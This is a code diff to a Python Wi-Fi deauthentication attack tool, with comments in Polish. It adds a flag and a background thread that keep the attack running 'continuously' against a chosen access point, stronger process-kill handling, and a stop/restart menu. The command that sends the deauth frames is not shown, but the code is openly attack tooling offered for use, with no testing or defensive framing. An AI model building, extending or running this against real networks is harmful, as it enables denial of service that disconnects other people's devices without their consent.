@@ -20,6 +20,7 @@ STYLE_BOLD = "\033[1m" if COLOR_ENABLED else ""
 
 # Global attack process variable
 ATTACK_PROCESS: Optional[subprocess.Popen] = None
+ATTACK_RUNNING = False
 
 
 def color_text(text: str, color: str) -> str:
@@ -349,7 +350,7 @@ def cleanup() -> None:
 
 
 def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> bool:
-    global ATTACK_PROCESS
+    global ATTACK_PROCESS, ATTACK_RUNNING
     bssid = target["bssid"]
     channel = target["channel"]
     if not bssid:
@@ -374,24 +375,33 @@ def start_deauth_attack(interface: str, target: Dict[str, Optional[str]]) -> boo
         logging.error("Failed to start deauth attack: %s", exc)
         return False
 
-    time.sleep(1)
+    time.sleep(2)  # Daj więcej czasu na inicjalizację
     if ATTACK_PROCESS.poll() is not None:
-        err_output = ATTACK_PROCESS.stderr.read().strip() if ATTACK_PROCESS.stderr else "unknown error"
+        err_output = ""
+        try:
+            if ATTACK_PROCESS.stderr:
+                err_output = ATTACK_PROCESS.stderr.read().strip()
+        except:
+            err_output = "unknown error"
         logging.error("Deauth process exited early: %s", err_output or "unknown error")
         ATTACK_PROCESS = None
         return False
 
+    ATTACK_RUNNING = True
+    logging.info(color_text("✓ Attack started successfully", COLOR_SUCCESS))
     return True
 
 
 def stop_attack() -> None:
-    global ATTACK_PROCESS
+    global ATTACK_PROCESS, ATTACK_RUNNING
     if ATTACK_PROCESS and ATTACK_PROCESS.poll() is None:
+        logging.info("Stopping deauth attack...")
         try:
             try:
                 pgid = os.getpgid(ATTACK_PROCESS.pid)
             except Exception:
                 pgid = None
+            
             if pgid is not None:
                 try:
                     os.killpg(pgid, signal.SIGTERM)
@@ -399,32 +409,64 @@ def stop_attack() -> None:
                     ATTACK_PROCESS.terminate()
             else:
                 ATTACK_PROCESS.terminate()
-            ATTACK_PROCESS.wait(timeout=3)
-        except subprocess.TimeoutExpired:
+            
             try:
-                if pgid is not None:
-                    os.killpg(pgid, signal.SIGKILL)
-                else:
-                    ATTACK_PROCESS.kill()
-            except Exception:
+                ATTACK_PROCESS.wait(timeout=5)
+            except subprocess.TimeoutExpired:
                 try:
-                    ATTACK_PROCESS.kill()
+                    if pgid is not None:
+                        os.killpg(pgid, signal.SIGKILL)
+                    else:
+                        ATTACK_PROCESS.kill()
+                    ATTACK_PROCESS.wait(timeout=2)
                 except Exception:
                     pass
-        except Exception:
-            pass
+        except Exception as e:
+            logging.warning("Error while stopping attack: %s", e)
+        
         try:
-            for _ in range(5):
+            for _ in range(10):
                 if ATTACK_PROCESS.poll() is not None:
                     break
-                time.sleep(0.2)
+                time.sleep(0.5)
         except Exception:
             pass
+    
     ATTACK_PROCESS = None
+    ATTACK_RUNNING = False
+
+
+def monitor_attack() -> None:
+    """Monitoruje proces ataku i informuje jeśli się zakończył nieoczekiwanie"""
+    global ATTACK_RUNNING
+    
+    check_count = 0
+    while ATTACK_RUNNING:
+        time.sleep(2)
+        check_count += 1
+        
+        if ATTACK_PROCESS is None:
+            break
+            
+        if ATTACK_PROCESS.poll() is not None:
+            logging.error("\n%s Attack process terminated unexpectedly!", color_text("✗", COLOR_WARNING))
+            if ATTACK_PROCESS.stderr:
+                try:
+                    stderr_content = ATTACK_PROCESS.stderr.read().strip()
+                    if stderr_content:
+                        logging.error("Error output: %s", stderr_content)
+                except:
+                    pass
+            ATTACK_RUNNING = False
+            break
+        
+        # Co 30 sekund wyświetl informację że atak nadal trwa
+        if check_count % 15 == 0 and ATTACK_RUNNING:
+            logging.info("%s Attack still running...", color_text("→", COLOR_HIGHLIGHT))
 
 
 def run_deauth_session() -> bool:
-    global SELECTED_INTERFACE
+    global SELECTED_INTERFACE, ATTACK_RUNNING
 
     interfaces = list_network_interfaces()
     SELECTED_INTERFACE = select_interface(interfaces)
@@ -464,34 +506,61 @@ def run_deauth_session() -> bool:
         logging.error("Failed to start deauth attack.")
         return False
     
-    logging.info("Deauth attack running. Press Ctrl+C or select an option below to stop.")
+    logging.info("")
+    logging.info("Deauth attack is now running continuously.")
+    logging.info("The attack will continue until you manually stop it.")
+    logging.info("")
+    logging.info(style("Options:", STYLE_BOLD))
+    logging.info("  [S] - Stop attack and return to interface selection")
+    logging.info("  [B] - Stop attack and return to main menu")
+    logging.info("  [R] - Stop attack and restart from scanning")
+    logging.info("  [Ctrl+C] - Emergency stop")
     logging.info("")
     
-    while True:
-        try:
-            choice = input(
-                f"{style('Stop attack', STYLE_BOLD)} (S), {style('back to main menu', STYLE_BOLD)} (B), "
-                f"or {style('restart', STYLE_BOLD)} (R): "
-            ).strip().lower()
-            
-            if choice in {"s", "stop"}:
-                stop_attack()
-                logging.info("Attack stopped.")
-                logging.info("")
-                break
-            elif choice in {"b", "back"}:
-                stop_attack()
-                return False
-            elif choice in {"r", "restart"}:
-                stop_attack()
-                return True
-            else:
-                logging.warning("Please enter S, B, or R.")
-        except KeyboardInterrupt:
-            stop_attack()
-            logging.info("\nAttack stopped by user.")
-            logging.info("")
-            break
+    # Uruchom wątek monitorujący atak w tle
+    import threading
+    monitor_thread = threading.Thread(target=monitor_attack, daemon=True)
+    monitor_thread.start()
+    
+    try:
+        while ATTACK_RUNNING:
+            try:
+                choice = input(
+                    f"{style('Enter option', STYLE_BOLD)} (S/B/R): "
+                ).strip().lower()
+                
+                if choice in {"s", "stop"}:
+                    stop_attack()
+                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
+                    logging.info("Returning to interface selection...")
+                    logging.info("")
+                    return True  # Restart
+                elif choice in {"b", "back"}:
+                    stop_attack()
+                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
+                    return False  # Back to main menu
+                elif choice in {"r", "restart"}:
+                    stop_attack()
+                    logging.info(color_text("✓ Attack stopped", COLOR_SUCCESS))
+                    logging.info("Restarting from network scan...")
+                    logging.info("")
+                    return True  # Restart
+                else:
+                    logging.warning("Please enter S, B, or R.")
+            except KeyboardInterrupt:
+                logging.info("\n")
+                confirm = input(f"{style('Really stop attack?', STYLE_BOLD)} (Y/N): ").strip().lower()
+                if confirm in {"y", "yes"}:
+                    stop_attack()
+                    logging.info(color_text("✓ Attack stopped by user", COLOR_SUCCESS))
+                    logging.info("")
+                    break
+                else:
+                    logging.info("Continuing attack...")
+                    continue
+    except Exception as e:
+        logging.error("Unexpected error: %s", e)
+        stop_attack()
     
     return False
 
